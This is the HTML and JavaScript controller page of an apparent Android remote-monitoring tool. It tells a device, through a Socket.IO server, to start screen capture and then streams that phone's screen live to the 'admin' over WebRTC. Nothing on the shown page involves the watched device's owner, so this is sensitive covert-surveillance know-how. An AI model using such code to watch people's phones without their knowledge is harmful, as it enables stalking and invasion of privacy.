<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Screen Monitor</title>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>

    <style>
        body {
            background: #111;
            color: #fff;
            font-family: Arial;
            text-align: center;
            padding: 20px;
        }

        h2 {
            color: #00e676;
        }

        input {
            padding: 10px;
            width: 160px;
            font-size: 16px;
            background: #222;
            color: white;
            border: 1px solid #444;
            border-radius: 6px;
        }

        button {
            padding: 10px 22px;
            font-size: 16px;
            margin-left: 5px;
            cursor: pointer;
            border: none;
            background: #2979ff;
            color: white;
            border-radius: 6px;
        }

        video {
            margin-top: 20px;
            width: 360px;
            height: 640px;
            background: black;
            border-radius: 15px;
            border: 3px solid #333;
        }

        .status {
            margin-top: 10px;
            color: #aaa;
            font-size: 14px;
        }
    </style>
</head>

<body>

<h2>ðŸ“± Live Screen Monitor</h2>

<input id="deviceId" placeholder="Device ID" value="278964">
<button onclick="startScreen()">â–¶ START</button>

<div class="status" id="status">Waiting...</div>

<video id="remoteVideo" autoplay playsinline></video>

<script>
    const socket = io("https://child-v9no.onrender.com");
    let pc = null;

    const statusText = document.getElementById("status");
    const video = document.getElementById("remoteVideo");

    socket.on("connect", () => {
        statusText.innerText = "ðŸŸ¢ Connected to Server";
        socket.emit("join-room", "ADMIN");
    });

    socket.on("disconnect", () => {
        statusText.innerText = "ðŸ”´ Disconnected";
    });

    function startScreen() {
        const deviceId = document.getElementById("deviceId").value.trim();

        if (!deviceId) {
            alert("Enter Device ID");
            return;
        }

        statusText.innerText = "ðŸ“¡ Requesting screen...";

        if (pc) {
            pc.close();
            pc = null;
        }

        socket.emit("send-command", {
            targetId: deviceId + "_screen",
            command: "start_screen"
        });
    }

    // ðŸ”¥ OFFER FROM ANDROID
    socket.on("offer", async (data) => {
        statusText.innerText = "âš¡ Connecting...";

        pc = new RTCPeerConnection({
            iceServers: [
                { urls: "stun:stun.l.google.com:19302" }
            ]
        });

        // âœ… PLAN_B SUPPORT
        pc.onaddstream = (event) => {
            console.log("ðŸŽ¬ STREAM RECEIVED");
            video.srcObject = event.stream;
            statusText.innerText = "âœ… LIVE SCREEN";
        };

        pc.onicecandidate = (event) => {
            if (event.candidate) {
                socket.emit("candidate", {
                    target: data.senderId,
                    candidate: event.candidate.candidate,
                    sdpMid: event.candidate.sdpMid,
                    sdpMLineIndex: event.candidate.sdpMLineIndex
                });
            }
        };

        await pc.setRemoteDescription({
            type: "offer",
            sdp: data.sdp
        });

        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);

        socket.emit("answer", {
            target: data.senderId,
            sdp: answer.sdp
        });
    });

    // ðŸ”¥ ICE FROM ANDROID
    socket.on("candidate", async (data) => {
        if (!pc) return;

        try {
            await pc.addIceCandidate(new RTCIceCandidate({
                candidate: data.candidate,
                sdpMid: data.sdpMid,
                sdpMLineIndex: data.sdpMLineIndex
            }));
        } catch (e) {
            console.log("ICE error", e);
        }
    });
</script>

</body>
</html>
